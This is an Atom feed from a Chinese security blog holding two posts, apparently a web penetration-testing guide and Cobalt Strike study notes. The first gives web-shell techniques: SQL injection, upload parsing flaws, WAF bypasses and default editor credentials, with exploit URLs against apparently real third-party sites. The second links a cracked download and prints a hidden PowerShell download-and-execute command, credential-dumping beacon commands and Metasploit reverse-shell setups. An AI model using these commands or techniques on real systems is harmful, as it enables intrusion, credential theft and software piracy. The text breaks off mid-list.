<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hello_C技术博客</title>
  <subtitle>一个小白的独白！</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2017-12-04T15:43:14.070Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>Hello_C</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>渗透测试--02漏洞查找与利用</title>
    <link href="http://yoursite.com/%E6%B8%97%E9%80%8F/2017/12/03/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-02%E6%BC%8F%E6%B4%9E%E6%9F%A5%E6%89%BE%E4%B8%8E%E5%88%A9%E7%94%A8.html"/>
    <id>http://yoursite.com/渗透/2017/12/03/渗透测试-02漏洞查找与利用.html</id>
    <published>2017-12-03T15:14:28.000Z</published>
    <updated>2017-12-04T15:43:14.070Z</updated>
    
    <content type="html"><![CDATA[<p>　　经过前期的信息搜集阶段，我们已经基本掌握了目标网站的敏感信息，比如：真实IP、二级域名、服务器、组件指纹等等敏感信息。这么信息对我们进行后期的渗透起到了至关重要的作用。常见的网站搭配：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">asp（aspx）+MSSQL</div><div class="line">asp（aspx）+ACCESS</div><div class="line">php+MYSQL</div><div class="line">jsp+MYSQL</div></pre></td></tr></table></figure></p>
<a id="more"></a>
<ul>
<li>asp（aspx）+MSSQL先考虑注入，一般的注入都有DBowner权限可以直接写shell；如果写不了，或者web与数据库分离，那就猜数据，从后台下手了，后台可以上传或者改配置文件；</li>
<li>asp（aspx）+ACCESS拿shell一般只有3种方法，一是前台上传或者注入进后台上传；二是注入进后台改配置文件；三是注入进后台备份数据库或者暴库后知道是asp或者asa数据库于是直接写一句话；</li>
<li>php+MYSQL一般是注入进后台上传，偶尔运气好些权限够高可以注入select into outfile；然后包含，分本地与远程，远程包含在高版本php是不力挺的，于是想办法本地上传图片文件或者写到log里；然后php程序某某未公开的漏洞，运气好可以直接写shell。</li>
<li>jsp+MYSQL利用数据库拿权限方面基本同php，而且jsp的上传基本很少检查文件后缀，于是只要有注入点与后台，拿shell相当的容易。jsp+ORACLE的站我碰到的不多，碰到的也是猜出用户名与密码从后台下手的。</li>
</ul>
<h3 id="0x01-扫描"><a href="#0x01-扫描" class="headerlink" title="0x01 扫描"></a>0x01 扫描</h3><p>　　在目标防护不是特别严的情况下，我们可以直接使用各种漏扫工具先进行一波漏洞扫描。如：Burp、Awvs、Appscan、Nessus等漏扫工具。对扫描出来的漏洞进一步进行手工验证。这样我们的工作效率可能会进一步提高，针对点也明确。<br>　　在进行目录扫描的时候，说不定可以一下扫出个上传点，直接上传shell，这是十分有可能的，有时候你花很久搞一个站，最后发现有个现成的上传点，而且很容易猜到，不过这种情况发生在asp居多！<br>　　对于目标各类web入口，普通网站后台、其他web入口，首先第一反应就是试试弱口令，第二万能密码，第三爆破，第四注入，登录口查找可以使用google语法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">url:xxxx url:login|admin</div><div class="line">url:xxxx intitle:管理|登录</div><div class="line">url:xxxx intext:管理|登录</div></pre></td></tr></table></figure></p>
<p>　　对于敏感文件的泄露，可能会扫描到一些源码泄露、目录遍历、各类探针文件、备份文件等，这样我们可以直接搜索到数据库用户名密码等敏感信息，或者直接进行代码审计，漏洞任你挖；或者识别出具体的CMS，先查找网上是否具有漏洞利用方法，然后下载对应版本信息进行代码审计。</p>
<h3 id="0x02-SQL注入"><a href="#0x02-SQL注入" class="headerlink" title="0x02 SQL注入"></a>0x02 SQL注入</h3><p>　　　　一般情况下拿到一个网站先找注入，后找上传，两者都没有，那就编辑器（eweb,和fck)，或者旁注，存在注入好的情况下可以直接写shell，或者拿到用户命密码后台拿shell。<br>SQL注入直接拿shell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">必须root权限；</div><div class="line">已知网站路径；</div><div class="line">GPC关闭；</div></pre></td></tr></table></figure></p>
<ul>
<li>php+mysql注入<br>　　联合查询注入、堆查询注入、基于时间的盲注、基于布尔的盲注、基于报错注入，一般这五种注入SQLmap基本都可以解决，在平时练习的时候可以手工进行练习，以便理解其中的原理以及基本的流程，在实战中可以使用sqlmap等提高我们的效率，前提是我们对注入的原理要有所了解，可以使用-V 3参数可以查看sqlmap注入时的payload。至于如何绕过WAF等，以后我们慢慢详细说明。</li>
<li>asp（aspx）+ACCESS<br>　　表名没得到注入：社工，对比url网站地址<br>　　列名没得到注入：偏移注入、社工、后台源码中参数名<br>　　偏移注入主要是针对知道表，但是不知道字段的。</li>
<li>asp（aspx）+MSSQL<br>　　MSSQL数据库的用户权限，一般有两种，一种是SA权限，这种权限很大，还有一种是DB_OWNER权限，这个权限赋给用户一些对数据库的修改、删除、新增数据库表，执行部分存储过程的权限。但是涉及到一些系统敏感操作权限不具备。<br>　　实际中我们遇到的最多的还是db_owner权限，我们常用的方法就是读网站目录，然后备份获取shell</li>
</ul>
<h3 id="0x03-文件上传"><a href="#0x03-文件上传" class="headerlink" title="0x03 文件上传"></a>0x03 文件上传</h3><p>　　如果运气好的话，我们可以扫到一直上传页面，这样我们就可以直接上传我们的一句话，例如：FCK编辑器的上传页面等，一些根本不需要进入后台就可以访问的上传页面。<br>　　文件上传的常用方法00截断、Apache、Ngnix、IIS等一些解析漏洞进行上传利用，绕过WAF的一些思路和方法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">WAF身份认证阶段的绕过</div><div class="line">    伪造搜索引擎</div><div class="line">    伪造白名单特殊目录</div><div class="line">    直接攻击源站</div><div class="line">WAF数据包解析阶段的绕过</div><div class="line">    编码绕过</div><div class="line">    修改请求方式绕过</div><div class="line">    复参数绕过</div><div class="line">WAF触发规则的绕过</div><div class="line">    特殊字符替换空格</div><div class="line">    特殊字符拼接</div><div class="line">    注释包含关键字</div></pre></td></tr></table></figure></p>
<ul>
<li>解析漏洞<br>（1）IIS 6.0 （除了解析asp，还解析asa, cer, cdx ）<br>文件名解析：test.jpg ——à a.asp;.test.jpg<br>目录解析：/test.jpg ——à /111.asp/test.jpg （该目录下需能创建文件夹）<br>（2）IIS 7.0/7.5 Ngnix （只能解析php）<br>www.xxx.com/test.jpg ——à www.xxx.com/test.jpg/.php<br>在网站图片位置后面+/.php乱码就存在解析漏洞，然后传图马，+/.php菜刀链接。<br>（3）Apache<br>Apache 是从右到左开始判断解析,如果为不可识别解析,就再往左判断.。<br>www.xxx.com/test.jpg ——à www.xxx.com/xx.php.xxxxxxx</li>
<li>上传漏洞攻击手法<br>（1）%00截断上传<br>（2）文件头修改<br>有的时候审核文件类型并不都是按后缀名，也可能按文件头内容，修改可突破。<br>GIF: gif89a jpg：JFIF<br>（3）文件类型修改</li>
<li>编辑器上传<br>（1）ewebeditor<br>辑器漏洞利用核心：获取编辑器地址</li>
</ul>
<p>1、Ewebeditor编辑器漏洞利用过程：获取编辑器地址，尝试获取编辑器后台地址，尝试默认账号密码登陆，如登陆失败可尝试下载默认数据库，破解其账号密码，登陆后台，尝试添加上传类型，如无确认按钮，可新增样式，新增插入图片，浏览上传，获取后门地址。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">默认后台地址：ewebeditor/admin_login.asp</div><div class="line">默认账号密码：admin admin/admin123/admin888</div><div class="line">默认数据库地址：ewebeditor/db/ewebeditor.mdb</div></pre></td></tr></table></figure></p>
<p>2、目录遍历（选择目录样式）<br><a href="http://www.kirinmach.com/ewebeditor//admin_uploadfile.asp?id=14&amp;dir=../../../" target="_blank" rel="external">http://www.kirinmach.com/ewebeditor//admin_uploadfile.asp?id=14&amp;dir=../../../</a>..<br>3、寻找前人痕迹再次入侵（下载的数据查找样式）<br><a href="http://www.njgyjx.com/ewebeditor/ewebeditor.asp?ID=45&amp;style=standard1" target="_blank" rel="external">http://www.njgyjx.com/ewebeditor/ewebeditor.asp?ID=45&amp;style=standard1</a><br>添加：asp，asa，php，aspx，aaspsp等类型<br>（2）fckeditor<br>首先确定网站脚本格式，然后寻找漏洞地址，访问上传，结合解析漏洞加以利用！<br>qq.asp;.jpg ==》qq.asp;.jpg （过滤：qqq_asp;.jpg）</p>
<p>突破fckeditor “.”过滤”_”：二次上传<br>第一次上传：qq.asp;.jpg ==》qq_asp;.jpg<br>第二次上传：qq.asp;.jpg ==》qq_asp;.jpg (不满足命名要求)，可能出现第二次命名为 qq.asp;(1).jpg（这样就符合解析漏洞格式）<br>新建上传<br>漏洞地址：<br>editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&amp;Type=Image&amp;CurrentFolder=/qing.asp&amp;NewFolderName=x.asp<br>结果：会建两个文件夹 /qing.asp/x_asp<br>手工新建：<br>/editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&amp;Type=Image&amp;CurrentFolder=/&amp;NewFolderName=xiaodi.asp<br>结果： /xiaodi<em>asp<br>原因：<br>CurrentFolder：当前文件夹 未进行过滤<br>NewFolderName：新建文件名 进行了过滤（将“.”过滤成“</em>”）</p>
<h3 id="0x04-其他漏洞"><a href="#0x04-其他漏洞" class="headerlink" title="0x04 其他漏洞"></a>0x04 其他漏洞</h3><p>XSS：可以利用XSS盲打后台。得到管理员的COOKLE和后台登录地址，可以直接登录后台拿shell；<br>任意文件下载：通常有下载功能的站我们可以尝试修改下URL文件名，看能否下载站点敏感文件，如数据库配置文件、配置文件等进行代码审计；<br>SSRF：可以利用SSRF得到真实IP，对内网进行扫描甚至攻击；<br>文件包含：可以包含本地的一些敏感信息或者远程包含拿shell；<br>变量覆盖：覆盖原始数据库配置信息（数据库地址，数据库账号密码，管理员账号密码）</p>
<h3 id="0x05-端口、中间件利用"><a href="#0x05-端口、中间件利用" class="headerlink" title="0x05 端口、中间件利用"></a>0x05 端口、中间件利用</h3><p>　　弱口令和everyone权限，比如21对应的FTP、1433对应的MSSQL、3306对应的MYSQL、3389对应的远程桌面、1521对应的Oracle等等，先试试弱口令和字典爆破，或许会有收获呢！<br>　　常见的一些中间件，如weblogic、Tomcat、jboss、JOnAS、WebSphere等一些中间件根据已经爆出的漏洞我们也可以直接拿到shell。</p>
<h3 id="0x06-其他"><a href="#0x06-其他" class="headerlink" title="0x06 其他"></a>0x06 其他</h3><p>爆网站路径：</p>
<ul>
<li>报错显示</li>
<li>漏洞报错</li>
<li>遗留文件：phpinfo</li>
<li>读取配置文件</li>
<li>社工</li>
</ul>
<p>后台拿shell:</p>
<ul>
<li>修改配置文件（模板修改）</li>
<li>数据库备份</li>
<li>抓包上传</li>
<li>执行SQL命令</li>
<li>插入一句话</li>
<li>修改上传类型</li>
</ul>
<p>网站cms识别<br>1、模板cms（开源源码程序）<br>Phpcms，dedecms，aspcms，WordPress，discuz，phpweb，php168等<br>2、非模板cms识别技术：<br>（1）工具识别：<br>Windows：指纹识别工具<br>Linux：whatweb<br>（2）人工识别：<br>图标logo，底部文件，后台标示，网站url地址,robots.txt等<br>介绍特定cms漏洞扫描两款工具：<br>（1）Wpscan：WordPress程序漏洞专用扫描器<br>（2）Joomscan：Joomla程序漏洞专用扫描器</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;　　经过前期的信息搜集阶段，我们已经基本掌握了目标网站的敏感信息，比如：真实IP、二级域名、服务器、组件指纹等等敏感信息。这么信息对我们进行后期的渗透起到了至关重要的作用。常见的网站搭配：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;asp（aspx）+MSSQL&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;asp（aspx）+ACCESS&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;php+MYSQL&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;jsp+MYSQL&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="渗透" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="渗透测试" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>Cobalt Strike学习笔记</title>
    <link href="http://yoursite.com/%E6%B8%97%E9%80%8F/2017/10/27/Cobalt-Strike%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html"/>
    <id>http://yoursite.com/渗透/2017/10/27/Cobalt-Strike学习笔记.html</id>
    <published>2017-10-27T03:45:22.000Z</published>
    <updated>2017-12-17T03:35:28.966Z</updated>
    
    <content type="html"><![CDATA[<p>　　Cobalt Strike 一款以metasploit为基础的GUI的框架式渗透测试工具，集成了端口转发、服务扫描，自动化溢出，多模式端口监听，win exe木马生成，win dll木马生成，java木马生成，office宏病毒生成，木马捆绑；钓鱼攻击包括：站点克隆，目标信息获取，java执行，浏览器自动攻击等等。Cobalt Strike主要用于团队作战，能让多个攻击者同时连接到团体服务器上，共享攻击资源与目标信息和sessions。<br>　　<a href="https://cobaltstrike.com/" target="_blank" rel="external">Cobalt Strike</a>，据说现在最新版为3.9，主要分为试用版和付费版，试用版为21天，付费版3500美元，据说网上也有一些<a href="http://www.cnblogs.com/haq5201314/p/7040832.html" target="_blank" rel="external">破解教程</a>，<a href="https://pan.baidu.com/s/1qYocNbm" target="_blank" rel="external">cobaltstrik3.6破解版下载</a> 密码: 51tg。因为Cobalt Strike是美国对外限制型出口软件，只在美国和加拿大允许发售，所以我们需要google搜索下usa的个人代理来绕开限制。<br><a id="more"></a></p>
<h2 id="0x01-安装与运行"><a href="#0x01-安装与运行" class="headerlink" title="0x01 安装与运行"></a>0x01 安装与运行</h2><p>　　Cobalt Strike需要JAVA环境，需要注意的是JAVA环境不要安装最新版，否则会出一些问题，Cobalt Strike分为客户端和服务端可分布式操作可以协同作战。但一定要架设在外网上，或者自己想要搭建的环境中，服务器端只能运行在Linux系统上。其中关键的文件是teamserver以及cobaltstrike.jar，将这两个文件放到服务器上同一个目录，然后运行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./teamserver 192.168.3.32 test   #自己的IP和密码</div></pre></td></tr></table></figure></p>
<p><img src="http://obh1qcqek.bkt.clouddn.com/17-10-27/38385816.jpg" alt=""><br>　　说一下我安装运行时遇到的坑，首先：JAVA版本必须为8，否则就因版本问题无法编译运行；二：IP必须为真实IP，不能使用0.0.0.0或者127.0.0.1，这样也会报错的。<br>　　服务器端运行之后，我们就可以运行客户端了，客户端可以在Windows或者Linux下都可以。输入我们刚才IP以及端口、密码，用户名可以任意设置。<br><img src="http://obh1qcqek.bkt.clouddn.com/17-10-27/28532677.jpg" alt=""><br><img src="http://obh1qcqek.bkt.clouddn.com/17-10-27/47388596.jpg" alt=""><br>　　当攻击目标在控制台所操作的指令都会被记录到保留在Cobalt Strike目录logs下，对了，破解版是无法更新的。</p>
<h2 id="0x02-参数详情"><a href="#0x02-参数详情" class="headerlink" title="0x02 参数详情"></a>0x02 参数详情</h2><ul>
<li><p>Cobalt Strike</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">New Connection  #进行另外一个连接，支持连接多个服务器端</div><div class="line">Preferences  #设置Cobal Strike界面、控制台、以及输出报告样式、TeamServer连接记录</div><div class="line">Visualization  #主要展示输出结果的形式</div><div class="line">VPN Interfaces  #设置VPN接口</div><div class="line">Listenrs  #创建一个Listener</div><div class="line">Script Manager  #</div><div class="line">Close  #退出连接</div></pre></td></tr></table></figure>
</li>
<li><p>View</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">Applications  #显示受害者机器的应用信息</div><div class="line">Credentials  #凭证当通过hashdump或者Mimikatz抓取过的密码都会储存在这里。</div><div class="line">Downloads  #下载文件</div><div class="line">Event Log  #主机上线记录以及团队协作聊天记录</div><div class="line">Keystrokes  #键盘记录</div><div class="line">Proxy Pivots  #代理模块</div><div class="line">Screenshots  #进程截图</div><div class="line">Script Console  #控制台,在这里可以加载[各种脚本](https://github.com/rsmudge/cortana-scripts)以增强功能</div><div class="line">Targets  #显示目标</div><div class="line">Web Log  #Web访问记录</div></pre></td></tr></table></figure>
</li>
<li><p>Attacks</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">Packages  #攻击包</div><div class="line">  HTML Application   生成恶意的HTA木马文件</div><div class="line">  MS Office Macro   生成office宏病毒文件</div><div class="line">  Payload Generator   生成各种语言版本的payload</div><div class="line">  USB/CD AutoPlay   生成利用自动播放运行的木马文件</div><div class="line">  Windows Dropper   捆绑器，能够对文档类进行捆绑</div><div class="line">  Windows Executable   生成可执行exe木马</div><div class="line">  Windows Executable(S)  生成无状态的可执行exe木马</div><div class="line">Web Drive-by  #钓鱼攻击</div><div class="line">  Manage  对开启的web服务进行管理</div><div class="line">  Clone Site  克隆网站，可以记录受害者提交的数据</div><div class="line">  Host File  提供一个文件下载，可以修改Mime信息</div><div class="line">  PowerShell Web Delivery  类似于msf 的web_delivery </div><div class="line">  Signed Applet Attack  使用java自签名的程序进行钓鱼攻击</div><div class="line">  Smart Applet Attack  自动检测java版本并进行攻击，针对Java 1.6.0_45以下以及Java 1.7.0_21以下版本</div><div class="line">  System Profiler  用来获取一些系统信息，比如系统版本，Flash版本，浏览器版本等</div><div class="line">Spear Phish  #用来邮件钓鱼的模块</div></pre></td></tr></table></figure>
</li>
<li><p>Reporting</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">activity report  #活动报告生成</div><div class="line">Hosts report  #主机报告</div><div class="line">Indicators opromisef com   #目标报告</div><div class="line">Sessions report  #会话报告</div><div class="line">Social engineering report  #社会工程报告</div><div class="line">Export data   #数据出口</div></pre></td></tr></table></figure>
</li>
<li><p>help</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Homepage  #官方主页</div><div class="line">Support  #技术支持</div><div class="line">Arsenal  #开发者</div><div class="line">System information  #版本信息</div><div class="line">About  #关于</div></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="0x03-基本运行"><a href="#0x03-基本运行" class="headerlink" title="0x03 基本运行"></a>0x03 基本运行</h2><p>　　首先使用Cobalt Strike需要创建一个Listener，点击 Cobalt Strike-&gt;Listeners ，然后点击Add便可以创建自己想要的Listeners了，Cobalt Strike3.6包括<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">windows/beacon_dns/reverse_dns_txt</div><div class="line">windows/beacon_dns/reverse_http</div><div class="line">windows/beacon_http/reverse_http</div><div class="line">windows/beacon_https/reverse_https</div><div class="line">windows/beacon_smb/bind_pipe</div><div class="line">windows/foreign/reverse_dns_txt</div><div class="line">windows/foreign/reverse_http</div><div class="line">windows/foreign/reverse_https</div><div class="line">windows/foreign/reverse_tcp</div></pre></td></tr></table></figure></p>
<p>　　其中windows/beacon是Cobalt Strike自带的模块，包括dns,http,https,smb四种方式的监听器，windows/foreign为外部监听器，即msf或者Armitage的监听器。 选择监听器以后，host会自动填写我们开启服务时的ip，配置监听端口，然后保存，监听器就创建好了。<br><img src="http://obh1qcqek.bkt.clouddn.com/17-10-27/29632476.jpg" alt=""><br>　　在创建好监听器，接下来就需要配置我们的客户端了，Cobalt Strike提供了多种包括攻击方式，在这里我们使用Powershell进行攻击。<br><img src="http://obh1qcqek.bkt.clouddn.com/17-10-28/7581397.jpg" alt=""><br><img src="http://obh1qcqek.bkt.clouddn.com/17-10-28/46855327.jpg" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&apos;http://192.168.3.83:8888/a&apos;))&quot;</div></pre></td></tr></table></figure></p>
<p>　　当我们在目标靶机运行上面这条Powershell之后，我们的Cobalt Strike客户端就会监听到我们的反弹链接，我们就可以看到已经有目标机上线。<br><img src="http://obh1qcqek.bkt.clouddn.com/17-10-28/28125408.jpg" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div></pre></td><td class="code"><pre><div class="line">beacon&gt; help    </div><div class="line"></div><div class="line">Beacon Commands</div><div class="line">===============    </div><div class="line"></div><div class="line">    Command                   Description</div><div class="line">    -------                   -----------</div><div class="line">    browserpivot              Setup a browser pivot session </div><div class="line">    bypassuac                 Spawn a session in a high integrity process</div><div class="line">    cancel                    Cancel a download that&apos;s in-progress</div><div class="line">    cd                        Change directory</div><div class="line">    checkin                   Call home and post data</div><div class="line">    clear                     Clear beacon queue</div><div class="line">    covertvpn                 Deploy Covert VPN client</div><div class="line">    desktop                   View and interact with target&apos;s desktop</div><div class="line">    dllinject                 Inject a Reflective DLL into a process</div><div class="line">    download                  Download a file</div><div class="line">    downloads                 Lists file downloads in progress</div><div class="line">    drives                    List drives on target</div><div class="line">    elevate                   Try to elevate privileges</div><div class="line">    execute                   Execute a program on target</div><div class="line">    exit                      Terminate the beacon session</div><div class="line">    getsystem                 Attempt to get SYSTEM</div><div class="line">    getuid                    Get User ID</div><div class="line">    hashdump                  Dump password hashes</div><div class="line">    help                      Help menu</div><div class="line">    inject                    Spawn a session in a specific process</div><div class="line">    jobkill                   Kill a long-running post-exploitation task</div><div class="line">    jobs                      List long-running post-exploitation tasks</div><div class="line">    kerberos_ccache_use       Apply kerberos ticket from cache to this session</div><div class="line">    kerberos_ticket_purge     Purge kerberos tickets from this session</div><div class="line">    kerberos_ticket_use       Apply kerberos ticket to this session</div><div class="line">    keylogger                 Inject a keystroke logger into a process</div><div class="line">    kill                      Kill a process</div><div class="line">    link                      Connect to a Beacon peer over SMB</div><div class="line">    logonpasswords            Dump credentials and hashes with mimikatz</div><div class="line">    ls                        List files</div><div class="line">    make_token                Create a token to pass credentials</div><div class="line">    mimikatz                  Runs a mimikatz command</div><div class="line">    mkdir                     Make a directory</div><div class="line">    mode dns                  Use DNS A as data channel (DNS beacon only)</div><div class="line">    mode dns-txt              Use DNS TXT as data channel (DNS beacon only)</div><div class="line">    mode http                 Use HTTP as data channel</div><div class="line">    mode smb                  Use SMB peer-to-peer communication</div><div class="line">    net                       Network and host enumeration tool</div><div class="line">    note                      Assign a note to this Beacon       </div><div class="line">    portscan                  Scan a network for open services</div><div class="line">    powershell                Execute a command via powershell</div><div class="line">    powershell-import         Import a powershell script</div><div class="line">    ps                        Show process list</div><div class="line">    psexec                    Use a service to spawn a session on a host</div><div class="line">    psexec_psh                Use PowerShell to spawn a session on a host</div><div class="line">    pth                       Pass-the-hash using Mimikatz</div><div class="line">    pwd                       Print current directory</div><div class="line">    rev2self                  Revert to original token</div><div class="line">    rm                        Remove a file or folder</div><div class="line">    rportfwd                  Setup a reverse port forward</div><div class="line">    runas                     Execute a program as another user</div><div class="line">    screenshot                Take a screenshot</div><div class="line">    shell                     Execute a command via cmd.exe</div><div class="line">    sleep                     Set beacon sleep time</div><div class="line">    socks                     Start SOCKS4a server to relay traffic</div><div class="line">    socks stop                Stop SOCKS4a server</div><div class="line">    spawn                     Spawn a session </div><div class="line">    spawnas                   Spawn a session as another user</div><div class="line">    spawnto                   Set executable to spawn processes into</div><div class="line">    steal_token               Steal access token from a process</div><div class="line">    timestomp                 Apply timestamps from one file to another</div><div class="line">    unlink                    Disconnect from parent Beacon</div><div class="line">    upload                    Upload a file</div><div class="line">    wdigest                   Dump plaintext credentials with mimikatz</div><div class="line">    winrm                     Use WinRM to spawn a session on a host</div><div class="line">    wmi                       Use WMI to spawn a session on a host</div></pre></td></tr></table></figure></p>
<h2 id="0x04-与msf进行联动"><a href="#0x04-与msf进行联动" class="headerlink" title="0x04 与msf进行联动"></a>0x04 与msf进行联动</h2><p>　　在Cobalt strike3.0 之后不再使用Metasploit框架而作为一个独立的平台使用，但是我们还是可以做到与msf联动。 首先我们使用msf的reverse_tcp开启监听模式：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">msf &gt; use exploit/multi/handler </div><div class="line">msf exploit(handler) &gt; set payload windows/meterpreter/reverse_tcp</div><div class="line">payload =&gt; windows/meterpreter/reverse_tcp</div><div class="line">msf exploit(handler) &gt; set lhost 192.168.3.33 </div><div class="line">lhost =&gt; 192.168.3.33</div><div class="line">msf exploit(handler) &gt; set lport 5555</div><div class="line">lport =&gt; 5555</div><div class="line">msf exploit(handler) &gt; exploit -j</div></pre></td></tr></table></figure></p>
<p>　　之后使用Cobalt Strike创建一个windows/foreign/reverse_tcp Listener，其中ip为msf的ip地址，端口为msf所监听的端口，然后选中计算机，右键-&gt;Spawn:<br>选择刚刚创建的监听器：</p>
<p>以下转载其他的一片文章，简要说明一下CS与msf之间的关系：</p>
<ul>
<li>msf获得了一个meterpreter的session，想把session传给cs<br>思路是使用msf中的inject payload来做，现在先假设已有一个meterpreter的session了，步骤如下：<br>在cs中新建监听<br><img src="http://obh1qcqek.bkt.clouddn.com/17-12-17/27583420.jpg" alt=""><br>点击save创建成功后我们便有了一个reverse_http监听者，监听者33890端口，等待被控机连接。此时切换到meterpreter中，输入下列命令<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">background # 切换到后台</div><div class="line">use exploit/windows/local/payload_inject</div><div class="line">set payload windows/meterpreter/reverse_http # 这里有个坑，不能使用x64的payload，我开始试验了很久一直失败，发现是x64的原因，换成x86的payload就好了</div><div class="line">set lhost 192.168.31.29 # cs的服务端IP</div><div class="line">set lport 33890 # 监听者的监听端口</div><div class="line">set session 1 # 这里是之前meterpreter的session编号</div><div class="line">set disablepayloadhandler true # 关闭payload的监听，因为msf和cs在同一台机器，而且这里用cs监听而不是msf</div><div class="line">exploit</div></pre></td></tr></table></figure>
</li>
</ul>
<p>此时机器便已成功从cs成功上线</p>
<ul>
